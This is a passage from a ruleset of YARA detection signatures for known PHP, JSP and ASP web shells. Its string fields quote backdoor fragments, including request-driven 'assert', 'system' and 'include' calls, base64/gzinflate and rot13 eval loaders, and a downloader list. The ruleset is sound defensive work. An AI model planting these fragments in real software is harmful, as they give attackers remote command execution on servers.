      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application" 
   condition: 
      all of them
}

rule Webshell_PHP_G5_RID2C69 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file G5.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:48:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op" 
   condition: 
      all of them
}

rule Webshell_PHP_r57142_RID2D62 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file r57142.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:29:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword
   condition: 
      all of them
}

rule Webshell_jsp_tree_RID2E02 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file tree.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki" 
      $s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ" 
   condition: 
      all of them
}

rule Webshell_C99madShell_v_3_0_smowu_RID3315 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file smowu.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:32:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for" 
      $s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty" 
   condition: 
      1 of them
}

rule Webshell_simple_backdoor_RID30D4 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file simple-backdoor.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:56:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$cmd = ($_REQUEST['cmd']);" fullword
      $s1 = "if(isset($_REQUEST['cmd'])){" fullword
      $s4 = "system($cmd);" fullword
   condition: 
      2 of them
}

rule Webshell_PHP_404_b_RID2D46 : DEMO SCRIPT T1087_001 T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 404.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:24:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1087_001, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)" 
   condition: 
      all of them
}

rule Webshell_Antichat_Shell_v1_3_2_RID3252 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Antichat Shell v1.3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:00:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m" 
   condition: 
      all of them
}

rule Webshell_Safe_mode_breaker_RID3164 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Safe mode breaker.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:20:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is(" 
      $s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)." 
   condition: 
      1 of them
}

rule Webshell_Sst_Sheller_RID2F0E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Sst-Sheller.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:40:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>" 
      $s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)" 
   condition: 
      all of them
}

rule Webshell_PHPJackal_v1_5_RID2F6E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file PHPJackal v1.5.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:56:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form" 
      $s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr" 
   condition: 
      all of them
}

rule Webshell_customize_RID2E89 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file customize.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:18:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z" 
   condition: 
      all of them
}

rule Webshell_s72_Shell_v1_1_Coding_RID3222 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file s72 Shell v1.1 Coding.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:52:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya " 
   condition: 
      all of them
}

rule Webshell_jsp_guige02_RID2EC5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file guige02.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:28:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff" 
      $s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private" 
   condition: 
      all of them
}

rule Webshell_Crystal_Crystal_RID30C9 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Crystal.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:54:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value" 
      $s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f" 
   condition: 
      all of them
}

rule Webshell_asp_ajn_RID2D82 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ajn.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
      $s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve" 
   condition: 
      all of them
}

rule Webshell_asp_list_RID2E05 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file list.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
      $s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword
   condition: 
      all of them
}

rule Webshell_PHP_co_RID2CBF : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file co.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:02:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
      $s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword
   condition: 
      all of them
}

rule Webshell_PHP_150_RID2C83 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 150.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:52:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "HJ3HjqxclkZfp" 
      $s1 = "<? eval(gzinflate(base64_decode('" fullword
   condition: 
      all of them
}

rule Webshell_PHP_c37_RID2CBA : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file c37.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:01:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj')," 
      $s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE]," 
   condition: 
      all of them
}

rule Webshell_PHP_b37_RID2CB9 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file b37.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:01:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc" 
   condition: 
      all of them
}

rule Webshell_asp_dabao_RID2E40 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file dabao.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:06:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &" 
      $s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-" 
   condition: 
      all of them
}

rule Webshell_php_2_RID2C7F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:51:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword
   condition: 
      all of them
}

rule Webshell_jsp_action_RID2ED0 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file action.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:30:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
      $s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword
   condition: 
      all of them
}

rule Webshell_Inderxer_RID2DE7 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Inderxer.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:51:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ" 
   condition: 
      all of them
}

rule Webshell_asp_Rader_RID2E37 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Rader.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:05:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0" 
      $s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 " 
   condition: 
      all of them
}

rule Webshell_c99_madnet_smowu_RID30ED : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file smowu.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:00:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "//Authentication" fullword
      $s1 = "$login = \"" fullword
      $s2 = "eval(gzinflate(base64_decode('" 
      $s4 = "//Pass" 
      $s5 = "$md5_pass = \"" 
      $s6 = "//If no pass then hash" 
   condition: 
      all of them
}

rule Webshell_minupload_RID2E6F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file minupload.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:14:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
      $s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859" 
   condition: 
      all of them
}

rule Webshell_PHP_bug_1__RID2E1A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file bug (1).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:00:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "@include($_GET['bug']);" fullword
   condition: 
      all of them
}

rule Webshell_caidao_shell_hkmjj_RID31F1 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file hkmjj.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:44:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s6 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword
   condition: 
      all of them
}

rule Webshell_jsp_asd_RID2D8A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file asd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:36:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
      $s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url" 
   condition: 
      all of them
}

rule Webshell_metaslsoft_RID2EE8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file metaslsoft.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:34:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t" 
   condition: 
      all of them
}

rule Webshell_asp_Ajan_RID2DC3 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Ajan.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:45:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate" 
   condition: 
      all of them
}

rule WEBSHELL_H4ntu_Shell_Powered_Tsoi_3_RID33B5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file h4ntu shell powered by tsoi.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:59:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2025-03-21"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b" 
      $s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui" 
      $s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= " 
   condition: 
      2 of them
}

rule Webshell_Jspspyweb_RID2E6D : DEMO SCRIPT T1112 T1505_003 T1543_003 WEBSHELL {
   meta:
      description = "Web Shell - file Jspspyweb.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:14:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1112, T1505_003, T1543_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7" 
      $s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control" 
   condition: 
      all of them
}

rule Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_RID3866 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 18:19:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n" 
      $s1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color" 
   condition: 
      1 of them
}

rule Webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend_RID3A73 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 19:47:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo" 
      $s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim" 
   condition: 
      1 of them
}

rule Webshell_jsp_12302_RID2D4A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 12302.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:25:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword
      $s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword
      $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"" 
   condition: 
      all of them
}

rule Webshell_php_up_RID2D32 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file up.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:21:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);" fullword
      $s3 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {" fullword
      $s8 = "echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];" fullword
   condition: 
      2 of them
}

rule Webshell_phpshell3_RID2E39 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file phpshell3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:05:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];" 
      $s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna" 
      $s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword
   condition: 
      2 of them
}

rule Webshell_B374kPHP_B374k_RID2E83 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file B374k.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Http://code.google.com/p/b374k-shell" fullword
      $s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'" 
      $s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
      $s4 = "B374k Vip In Beautify Just For Self" fullword
   condition: 
      1 of them
}

rule Webshell_phpkit_1_0_odd_RID2FEB : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file odd.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "include('php://input');" fullword
      $s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
      $s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
   condition: 
      all of them
}

rule Webshell_jsp_123_RID2CE8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 123.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:09:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7" 
      $s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"" 
      $s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword
   condition: 
      all of them
}

rule Webshell_ASP_tool_RID2DA7 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file tool.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:41:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\"" 
      $s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" " 
      $s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas" 
   condition: 
      2 of them
}

rule Webshell_PHP_Shell_x3_RID2EEF : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file PHP Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:35:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[" 
      $s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input" 
      $s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset(" 
   condition: 
      2 of them
}

rule Webshell_Macker_s_Private_PHPShell_RID3444 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Macker's Private PHPShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:23:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n" 
      $s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[" 
      $s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=" 
   condition: 
      all of them
}

rule Webshell_jsp_list_RID2E0E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file list.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:58:11"
